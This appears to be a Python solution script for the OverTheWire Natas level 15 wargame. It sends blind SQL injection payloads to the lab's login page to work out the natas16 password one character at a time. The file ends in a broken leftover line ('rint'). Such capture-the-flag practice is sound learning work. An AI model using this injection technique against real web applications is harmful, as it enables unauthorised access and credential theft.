#!/bin/python3
import string
import requests

# page login creds
user = "natas15"
passwd = "lost passowrd when i refactored this file for a later test"
url = "http://natas15.natas.labs.overthewire.org?username={0}&debug=1"
check_string = "This user exists."

# password stuffs
charset = [ch for ch in (string.ascii_lowercase + string.ascii_uppercase  + string.digits)]

pass_charset = ""
for ch in charset:
    uri = url.format('natas16" and password like BINARY "%' + ch + '%" ; -- ')

    res = requests.get(uri, auth=(user, passwd)).text
    if check_string in res:
        pass_charset = "".join([pass_charset, ch])
        print("charset: " + pass_charset)


new_password = ""
found = False
while True:
    found = False

    for char in pass_charset:
        uri = url.format('natas16" and password like BINARY "' + ''.join([new_password, char]) + '%" ; -- ')
        response = requests.get(uri, auth=(user, passwd))

        res = requests.get(uri, auth=(user, passwd)).text
        if check_string in res:
            found = True
            new_password = ''.join([new_password, char])
            print("Character found: " + new_password)
            break

    if not found:
        break

print("Final password:" + new_password)
        



rint("Length: {0}, Password: {1}".format(len(password),password))
